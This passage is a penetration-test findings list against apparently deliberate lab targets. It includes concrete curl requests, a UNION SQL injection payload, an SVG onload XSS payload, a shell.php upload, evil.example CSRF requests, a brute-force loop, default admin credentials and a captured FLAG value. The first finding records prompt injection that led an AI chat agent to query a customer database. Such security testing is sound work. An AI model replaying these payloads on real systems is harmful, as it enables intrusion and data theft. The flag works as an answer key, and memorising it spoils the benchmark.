description: POST /api/ai/chat/anonymous needs no authentication; the underlying agent is instructed (per its leaked system prompt) to obey any override and to query the customer database without restriction. Injected instructions were accepted and the response reports database_accessed:true.
steps:

2. Response ai_response.response complies and ai_response.database_accessed:true, context_included:false; endpoint has no auth gate.
evidence: prompt injection accepted, database_accessed:true, no authentication required

title: CORS policy reflects arbitrary Origin allowing cross-origin authenticated reads
description: The server reflects the request's Origin in Access-Control-Allow-Origin and allows the authorization header and all methods, so any external site can read responses from the API.
steps:
1. GET /login with header Origin: http://evil.example -> response Access-Control-Allow-Origin: http://evil.example.
2. OPTIONS preflight to /dashboard with Origin http://evil.example -> reflects origin + Access-Control-Allow-Headers: authorization + Access-Control-Allow-Methods incl. GET/POST/PUT/PATCH/DELETE.
evidence: arbitrary Origin http://evil.example reflected in ACAO, authorization allowed

title: Verbose database/error messages leak SQL structure and internals
description: Several endpoints return raw database errors containing internal SQL and schema. /check_balance with a null byte leaks the literal query; /api/virtual-cards/{id}/update-limit leaks a PostgreSQL statement; /api/transactions leaks UNION/column errors.
steps:
1. GET /check_balance/%00 -> error shows "SELECT username, balance FROM users WHERE account_number='...'."
2. POST /api/virtual-cards/1/update-limit {"limit":999999} -> error "syntax error at or near \"limit\" LINE 3: SET limit = 999999.0".
3. amount 'abc' on /transfer -> "could not convert string to float: 'abc'".
evidence: raw SQL query and PostgreSQL statements echoed in error responses

title: /register response leaks plaintext password and internal debug data
description: On successful registration the API returns a debug_data object containing the user's plaintext password (raw_data.password), account_number, user_id, is_admin flag, server client info and registration time.
steps:
1. POST /register {"username":"alice_42937","password":"AlicePass123!"}.
2. Response debug_data.raw_data.password == 'AlicePass123!' plus account_number 0170429248, user_id 2, is_admin false, server_info 'curl/8.22.0'.
evidence: plaintext password and internal fields returned in registration response

title: /login response leaks internal debug_info and admin flag
description: The login response includes a debug_info object with user_id, is_admin, account_number and login_time alongside the JWT, exposing internals and confirming the privilege field an attacker targets.
steps:
1. POST /login {"username":"<user>","password":"<pw>"}.
2. Response debug_info: {user_id:2, is_admin:false, account_number:'0170429248', login_time:...}.
evidence: debug_info with is_admin and user_id returned on login

title: Username enumeration via registration and password-reset endpoints
description: POST /register reveals whether a username already exists ('Username already exists') and /api/v*/forgot-password returns 404 'User not found' for absent users vs 200 for existing ones, allowing bulk account enumeration.
steps:
1. POST /register with an existing username -> {message:'Username already exists'}.
2. POST /api/v1/forgot-password {"username":"nonexistent"} -> 404 'User not found'; with a valid username -> 200 success. The status difference enumerates valid accounts.
evidence: distinct 'Username already exists' / 'User not found' responses reveal account existence

title: No authentication rate limiting or lockout on /login
description: The login endpoint has no rate limit, attempt throttling, or lockout, allowing unlimited password-guessing attempts against any account (useful for credential stuffing/brute force).
steps:
1. Fire 8 rapid POST /login with wrong passwords for the same account.
2. All return HTTP 401 with identical response and no delay/captcha/lockout; further attempts continue unhindered.
evidence: 8 rapid failed logins all returned 401 with no throttling

title: Passwords stored in plaintext
description: The users table stores passwords in cleartext, confirmed via the /check_balance UNION SQLi dump which returned readable passwords (e.g. admin='admin123', alice='AlicePass123!'). No hashing is applied.
steps:
1. Exploit SQLi in /check_balance to SELECT password FROM users.
2. Returned values are the real plaintext passwords, not hashes.
evidence: SQLi dump returned plaintext admin password 'admin123'

title: Weak/default administrator credentials (admin:admin123)
description: The admin account uses the well-known default password 'admin123', which is also the value exposed by the SQLi. An attacker can log in directly as administrator.
steps:
1. POST /login {"username":"admin","password":"admin123"}.
2. Response Login successful with isAdmin:true and an admin JWT token.
evidence: admin/admin123 returns isAdmin:true token

title: JWT tokens have no expiration (missing exp claim)
description: Issued JWTs contain only user_id, username, is_admin and iat with no exp claim, and there is no server-side revocation, so a stolen token remains valid forever.
steps:
1. Decode a login token payload: {"user_id":2,"username":"...","is_admin":false,"iat":...} -> no exp.
2. A token issued minutes earlier still returns HTTP 200 on /dashboard indefinitely.
evidence: JWT payload contains no exp; tokens never expire

title: No session/token invalidation on password change or logout
description: There is no logout endpoint and a JWT remains valid after the password is reset, so an attacker who captured a token retains access even after the victim changes their password.
steps:
1. Login as user, capture token; GET /dashboard -> 200.
2. Reset the password via /api/v1/forgot-password + reset-password.
3. Re-use the OLD token: GET /dashboard still returns 200, proving the token was not revoked.
evidence: old token still returned 200 after password reset

title: Weak password policy accepts trivially guessable passwords
description: POST /register imposes no minimum length or complexity; single-character and common passwords are accepted, weakening all accounts.
steps:
1. POST /register {"username":"wp_X","password":"a"} -> registration successful.
2. Also accepted: '123456', 'password'.
evidence: passwords 'a', '123456', 'password' all accepted

title: Loan amount is not validated (negative/zero/absurd values accepted)
description: POST /request_loan accepts negative, zero, and arbitrarily huge amounts, which are then creditable through /admin/approve_loan, enabling fraudulent loan creation.
steps:
1. Auth as user. POST /request_loan {"amount":-10000} -> 'Loan requested successfully'.
2. {"amount":999999999999} also accepted.
3. Approved loans credit the amount to the account (loan 1 amount 5000 credited, balance 1000->6000).
evidence: negative and huge loan amounts accepted without validation

title: Missing security headers on all responses
description: Responses omit Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security and Referrer-Policy, leaving the app exposed to clickjacking, MIME sniffing and XSS amplification over plain HTTP.
steps:
1. curl -sD- http://vuln-bank:5000/login -> none of CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy present.
2. Server header discloses Werkzeug/2.0.1 Python/3.9.25.
evidence: no CSP/XFO/XCTO/HSTS headers in any response

title: Stored XSS via unrestricted SVG profile-picture upload
description: Profile picture upload accepts SVG files, which are served inline with Content-Type image/svg+xml and Content-Disposition inline, so embedded JavaScript executes in the origin of anyone who views the image.
steps:
1. Auth as user. POST /upload_profile_picture multipart with an .svg containing <svg xmlns=... onload="alert(document.domain)">.
2. Response file_path e.g. static/uploads/998787_evil.svg.
3. GET /static/uploads/998787_evil.svg -> served as image/svg+xml inline with the onload handler intact (anonymous access).
evidence: uploaded SVG served inline as image/svg+xml with onload=alert executing

title: Unrestricted file upload allows any file type
description: POST /upload_profile_picture accepts arbitrary file types (.php, .txt, any MIME) with no content-type or extension validation, storing them under a predictable public path (static/uploads/), which enables malware hosting and the XSS above.
steps:
1. Upload shell.php (Content-Type application/x-php) -> 'Profile picture uploaded successfully', path static/uploads/461004_shell.php.
2. Upload x.txt (text/plain) also accepted.
3. Files are retrievable by name from the public /static/uploads/ directory.
evidence: .php and .txt uploads accepted and stored in public /static/uploads/

title: Authentication via JWT cookie without SameSite attribute and no CSRF protection
description: Login sets the session JWT in a Set-Cookie header ('token=<jwt>; HttpOnly; Path=/') with no SameSite and no Secure attribute, and state-changing endpoints authenticate using this cookie with no anti-CSRF token. Because the browser auto-sends the cookie, a cross-site request can act on the victim's behalf on any browser that does not default to SameSite=Lax.
steps:
1. POST /login -> response header: Set-Cookie: token=<jwt>; HttpOnly; Path=/ (no SameSite, no Secure).
2. GET /api/transactions?account_number=<own acct> with ONLY 'Cookie: token=<jwt>' (no Authorization header) -> HTTP 200, proving cookie-based authentication is accepted.
3. POST /transfer with the cookie and no CSRF token reached the handler (returned a body-parsing 500, not 401/403), confirming no CSRF verification.
evidence: JWT issued as cookie (no SameSite); cookie alone authenticates GET /api/transactions (200)

title: SQL Injection in /transactions/{account_number} (unauthenticated)
description: The same account_number path parameter used by the BOLA endpoint is concatenated into the transaction query (WHERE from_account='...'). No authentication is required; a UNION payload raises a PostgreSQL column-count error and a trailing comment alters the query, confirming injection into a data-exposing endpoint.
steps:
1. GET /transactions/<acct>' UNION SELECT username,password FROM users--  (URL-encode) -> 500 error "each UNION query must have the same number of columns ... WHERE from_account='...'."
2. GET /transactions/0170429248'-- -> 200, returns transactions (comment injection), no token sent.
evidence: UNION error leaked query 'WHERE from_account=...'; comment payload returned data with no auth

title: IDOR read: /edit_draft/<id> lets any user read any other user's drafts (incl. admin draft with secret)
description: The GET /edit_draft/<id> endpoint only requires an authenticated session and performs no ownership check. Draft IDs are sequential integers. Authenticated user bobZ9 can read aliceX7's draft (id=2) and the admin user's draft (id=1), whose content contained sensitive data (a FLAG{...} string), simply by changing the id in the URL.
steps:
1. Register/login as any user (bobZ9/Passw0rd!b) to get session cookie.
2. curl -s -H 'Cookie: session=<bob_token>' http://xben-090:5003/edit_draft/1
3. Response 200 OK renders admin's draft: title value="admin_draft", textarea content FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}.
4. Repeat with /edit_draft/2 to read aliceX7's draft.
evidence: GET /edit_draft/1 as bobZ9 -> 200, body contains textarea 'FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}'; GET /edit_draft/2 -> 200 with aliceX7's draft content.

title: IDOR write: POST /edit_draft/<id> lets any user modify or overwrite any other user's draft
description: The POST /edit_draft/<id> endpoint applies no ownership check. bobZ9 overwrote the title and content of aliceX7's draft id=2 (observed by aliceX7 as title 'PWNED_BY_BOB'; reverted afterwards). The admin draft id=1 can be overwritten the same way.
steps:
1. As bobZ9: curl -s -D - -H 'Cookie: session=<bob_token>' -X POST http://xben-090:5003/edit_draft/2 --data-urlencode 'title=PWNED_BY_BOB' --data-urlencode 'content=idor write test' --data-urlencode 'submit=Save Draft' -> 302 FOUND.
2. As aliceX7: GET /edit_draft/2 -> title field value="PWNED_BY_BOB" confirms the foreign object was modified.
3. Same POST works against /edit_draft/1 (admin's draft) - returns 302 and saves.
evidence: bob POST /edit_draft/2 -> 302; alice GET /edit_draft/2 shows title 'PWNED_BY_BOB'. bob POST /edit_draft/1 -> 302 (admin draft writable).

title: Broken object-level authorization on /<username>/drafts: any user can list any other user's drafts
description: GET /<username>/drafts is only checked for being logged in; the <username> path parameter is never matched against the session identity. As bobZ9, requesting /aliceX7/drafts returns aliceX7's draft titles plus /edit_draft/<id> links, and /admin/drafts returns the admin user's draft (id=1, 'admin_draft').
steps:
1. Login as bobZ9.
2. curl -s -H 'Cookie: session=<bob_token>' http://xben-090:5003/aliceX7/drafts -> 200, heading "aliceX7's Drafts" listing 'Alice' with href=/edit_draft/2.
3. curl -s -H 'Cookie: session=<bob_token>' http://xben-090:5003/admin/drafts -> 200, heading "admin's Drafts" with href=/edit_draft/1.
evidence: bobZ9 GET /admin/drafts -> 200 'admin's Drafts' + edit_draft/1 link; bobZ9 GET /aliceX7/drafts -> 200 lists alice's draft id 2.

title: Logout does not invalidate the session token; static Flask-Login _id and no expiry make stolen cookies permanently usable
description: /logout only instructs the browser to delete the cookie (Set-Cookie session=; Max-Age=0); the previously issued signed token keeps authenticating (still 200 on protected pages after logout). The session payload also contains no per-login nonce: every login of a user produces the identical claims {'_fresh':true,'_id':'7ab7039c...','_user_id':'X'} (only the itsdangerous timestamp part changes), _id being one constant shared by ALL users/sessions (alice, weakTestQ, roleTest1 all show the same _id). There is no server-side revocation or expiry, so any captured token is a permanent credential even after the user logs out or re-logs in.
steps:
1. Login as aliceX7 -> token T.
2. GET /logout -> 302 with Set-Cookie session= (deleted).
3. curl -H 'Cookie: session=T' http://xben-090:5003/aliceX7/drafts -> still 200 OK (logout did not revoke T).
4. Login again -> zlib-decode new cookie: identical claims, same _id '7ab7039c2c4c7410...' as the token from step 1; _id equals the one found in every other user's session.
evidence: Token issued 15:18 UTC worked at 15:40+ after /logout; _id identical across aliceX7(id3), weakTestQ(id5), roleTest1(id6) sessions.

title: Username enumeration through registration error message
description: POST /register with an existing username returns a distinct flash message 'Username already exists. Please choose a different one.' while unknown usernames register successfully (302). This lets an attacker enumerate valid accounts (e.g. confirm 'admin' exists).
steps:
1. curl -s -X POST http://xben-090:5003/register --data-urlencode 'username=aliceX7' --data-urlencode 'password=Zzz12345!' --data-urlencode 'confirm_password=Zzz12345!'
2. Response 200 contains 'Username already exists. Please choose a different one.'
3. Any unused username returns 302 'Registration successful' - differential response identifies valid users.
evidence: Register existing 'aliceX7' -> 200 + 'Username already exists...'; fresh name -> 302 registration successful.

title: Account existence oracle on /<username>/drafts (200 vs 404) for authenticated users
description: GET /<username>/drafts returns 200 for every existing account (aliceX7, bobZ9, admin, weakTestQ, roleTest1...) and 404 for non-existing usernames, letting any logged-in user enumerate all registered accounts, including 'admin'.
steps:
1. Login as bobZ9.
2. curl -s -o /dev/null -w '%{http_code}' -H 'Cookie: session=<bob_token>' http://xben-090:5003/admin/drafts -> 200.
3. Same request for /nosuchuserZ99/drafts -> 404 (207 bytes standard 404 page).
evidence: /admin/drafts 200 vs /nosuchuserZ99/drafts 404 for the same session.

title: No password policy: single-character passwords accepted at registration
description: POST /register accepts a 1-character password ('1') and no complexity rules; account weakTestQ was created and logs in with password '1'. Combined with the missing rate limiting this enables credential guessing against arbitrary accounts.
steps:
1. curl -s -D - -X POST http://xben-090:5003/register --data-urlencode 'username=weakTestQ' --data-urlencode 'password=1' --data-urlencode 'confirm_password=1' -> 302 'Registration successful'.
2. POST /login username=weakTestQ password=1 -> 302 + session cookie (_user_id 5).
evidence: Account with password '1' created and successfully authenticated (session payload {'_user_id':'5'}).

title: Missing brute-force protection / rate limiting on POST /login
description: 20 consecutive wrong-password attempts against the 'admin' account completed in 2 seconds, all answered with the normal 200 'Invalid username or password' page; no lockout, delay, captcha or IP throttling. X-Forwarded-For handling was irrelevant because no limit exists at all.
steps:
1. for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code} ' -X POST http://xben-090:5003/login --data-urlencode 'username=admin' --data-urlencode "password=wrong$i" -d 'submit=Login'; done
2. All 20 responses are HTTP 200 in ~2s; subsequent attempts (also with X-Forwarded-For: 1.2.3.4) are unaffected.
evidence: 20/20 failed logins processed, no 429/lockout.

title: Cross-Site Request Forgery on POST /edit_draft/<id> (no CSRF token, no Origin/Referer validation)
description: State-changing draft edit forms contain no anti-CSRF token (only title/content/submit) and the server accepts requests carrying foreign Origin headers, so any website can silently modify a logged-in victim's (or admin's) drafts.
steps:
1. Verify form: GET /edit_draft/4 as bobZ9 -> no csrf/token fields.
2. Simulate cross-site request: curl -s -D - -o /dev/null -H 'Cookie: session=<bob_token>' -H 'Origin: http://evil.example' -X POST http://xben-090:5003/edit_draft/4 --data-urlencode 'title=CSRF_proof' --data-urlencode 'content=proof' -> HTTP/1.1 302 FOUND (change applied).
3. Same absence of protection on POST /create_draft.
evidence: Cross-origin POST with attacker Origin header returned 302 and modified draft; forms carry no token.

title: Cross-Site Request Forgery on POST /login (login CSRF, no token)
description: The login form has no anti-CSRF token and the endpoint performs no Origin/Referer check, allowing an attacker to force a victim's browser to log in to an attacker-controlled account - confirmed by a 302 login response from a foreign-Origin request.
steps:
1. curl -s -D - -o /dev/null -H 'Origin: http://evil.example' -X POST http://xben-090:5003/login --data-urlencode 'username=bobZ9' --data-urlencode 'password=Passw0rd!b' -d 'submit=Login' -> 302 FOUND + Set-Cookie session (login succeeded cross-origin).
2. Login page HTML contains no token field.
evidence: Foreign-Origin POST /login -> 302 to /bobZ9/drafts with new session cookie.

title: Missing security headers on all responses (CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, HSTS)
description: Responses only contain Server/Date/Content-Type/Content-Length/Vary/Cookie headers: no Content-Security-Policy, no X-Frame-Options or frame-ancestors (clickjacking of draft-editing pages possible), no X-Content-Type-Options, no Referrer-Policy, no Strict-Transport-Security.
steps:
1. curl -s -D - -o /dev/null http://xben-090:5003/
2. Inspect headers: none of the listed security headers present on login/dashboard/draft pages.
evidence: Header dumps in artifacts/root_001.txt etc.: no CSP/XFO/XCTO/Referrer-Policy/HSTS.

title: Session cookie issued without Secure and SameSite attributes
description: Set-Cookie: session=...; HttpOnly; Path=/ - the HttpOnly flag is set but SameSite is absent (legacy browsers send the cookie cross-site, enabling the CSRF findings) and Secure is absent, so the long-lived session token can traverse cleartext HTTP.
steps:
1. curl -s -D - -o /dev/null -X POST http://xben-090:5003/login --data-urlencode 'username=bobZ9' --data-urlencode 'password=Passw0rd!b' -d 'submit=Login'
2. Set-Cookie header contains only HttpOnly; Path=/ - no Secure, no SameSite.
evidence: Set-Cookie: session=.eJwl...; HttpOnly; Path=/

title: Server banner discloses framework and versions (Werkzeug/3.0.6 Python/3.8.20)
description: Every response exposes 'Server: Werkzeug/3.0.6 Python/3.8.20', telling attackers the stack (Flask/Werkzeug versions) for targeted exploit research; Werkzeug 3.0.6 itself is current but Python 3.8.20 is an EOL-era interpreter.
steps:
1. curl -s -D - -o /dev/null http://xben-090:5003/
2. Header: Server: Werkzeug/3.0.6 Python/3.8.20.
evidence: Server header present on every response (artifacts/root_001.txt).

title: Unprotected state-changing GET /logout allows cross-site forced logout (CSRF by design)
description: /logout is a GET request that deletes the victim's session with no token or referer validation; any page can embed and forcibly log out every logged-in visitor (session termination CSRF).
steps:
1. curl -s -D - -H "Cookie: session=<alice_token>" -H 'Referer: http://evil.example/x' http://xben-090:5003/logout
2. Response 302 + Set-Cookie: session=; Max-Age=0 (session terminated for that visitor).
evidence: Cross-referer GET /logout returned 302 and expired the session cookie.

title: No size limit on draft 'content' field (unbounded storage writes, title is capped but content is not)
description: POST /create_draft and POST /edit_draft/<id> enforce a 100-char cap on 'title' (300 chars -> validation error 200) but accept arbitrarily large 'content' - a 60 KB payload was stored verbatim; repeated requests could bloat storage (allocation without limits). Same missing bound on /create_draft.
steps:
1. As bobZ9: curl -s -D - -o /dev/null -H 'Cookie: session=<tok>' -X POST http://xben-090:5003/edit_draft/4 --data-urlencode 'title=CSRF_proof' --data-urlencode 'content=<60000 x chars>' --data-urlencode 'submit=Save Draft' -> 302; GET /edit_draft/4 shows 60000-char content stored.
2. Same behavior on POST /create_draft (50 KB accepted).
evidence: 60,000-char content saved and returned; title>100 rejected proving the check exists but omits content.

title: Unhandled exception (HTTP 500) on GET /edit_draft/<id> for ids >= 2^63 - integer overflow with no error handling
description: The id path converter accepts arbitrarily large integers; values that exceed the 64-bit range (e.g. 99999999999999999999 or 9223372036854775808) are passed to the database query and raise an unhandled exception, returning HTTP 500 with a generic Werkzeug error page instead of a validation error. Same behavior exists on POST /edit_draft/<id>. No stack trace leaks, but the crash demonstrates absent input bounds and can be triggered by any authenticated user.
steps:
1. curl -s -o /dev/null -w '%{http_code}' -H 'Cookie: session=<any_user_token>' http://xben-090:5003/edit_draft/9223372036854775808 -> 500
2. http://xben-090:5003/edit_draft/2147483648 -> 404 (normal), showing only >2^63 range errors out
3. Response body: '500 INTERNAL SERVER ERROR' Werkzeug page (no debug traceback).
